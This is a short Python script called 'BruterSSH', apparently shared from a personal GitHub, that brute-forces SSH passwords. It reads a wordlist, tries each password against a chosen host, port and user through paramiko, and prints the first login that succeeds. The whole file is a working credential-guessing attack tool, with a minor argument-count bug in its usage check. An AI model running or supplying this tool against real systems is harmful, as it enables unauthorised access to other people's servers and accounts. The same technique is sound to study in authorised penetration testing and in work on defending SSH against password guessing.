#!/usr/bin/env python3

#     ++++++++++++++++++++++++++++++++
#     +                              +
#     +	          BruterSSH          +
#     +                              +
#     ++++++++++++++++++++++++++++++++
#Created by Gr4y_kt
#My Github ---> https://github.com/Gr4ykt

import sys, paramiko, time, signal
from pwn import *
#ctrl_c
def def_handler(sig, frame):
	print("\n[!]Saliendo de {}".format(sys.argv[0]))
	sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

if len(sys.argv) < 3:
	print("[!] Use: {} <host> <port> <user> <dictionary>".format(sys.argv[0]))
	sys.exit(1)

if __name__ == '__main__':
	host = sys.argv[1]
	port = sys.argv[2]
	user = sys.argv[3]
	dir  = sys.argv[4]

	p1 = log.progress("")
	with open(dir, 'r') as fp:
		for password in fp.read().splitlines():
			p1.status("Try with: %s"%(password))
			cliente = paramiko.SSHClient()
			cliente.set_missing_host_key_policy(paramiko.AutoAddPolicy())

			try:
				cliente.connect(host, port=port, username=user, password=password)
				print("Login succesfull: {}:{}".format(user,password))
				break

			except:
				pass

			time.sleep(1)
